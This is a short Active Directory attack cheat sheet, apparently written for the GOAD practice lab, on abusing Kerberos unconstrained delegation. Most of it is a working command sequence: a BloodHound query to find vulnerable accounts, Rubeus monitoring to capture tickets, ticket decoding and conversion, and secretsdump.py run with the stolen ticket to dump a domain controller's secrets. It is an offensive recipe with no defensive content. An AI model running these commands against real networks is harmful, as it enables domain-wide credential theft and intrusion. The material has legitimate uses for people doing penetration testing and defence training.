If an account (user or computer), with unconstrained delegations privileges, is compromised, an attacker can wait for a privileged user to authenticate on it (or force it) using Kerberos.

# Find this configuration

```
    MATCH (c {unconstraineddelegation:true}) return c
```

# Exploit it

- with Rubeus

```
Rubeus.exe monitor /interval:5
```

Then copy the ticket without space and return line, in vim you can do:
```
%s/\s*\n\s*//g
```
Decode the b64 ticket to get a kirby format:
```
cat tgt.b64|base64 -d > ticket.kirbi
```
Then convert kirbi ticket:
``` 
ticketConverter.py ticket.kirbi ticket.ccache
```
Finaly you can use it!
```
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
```

# Notes: 

By default on AD all domain controller are setup with unconstrained delegation.

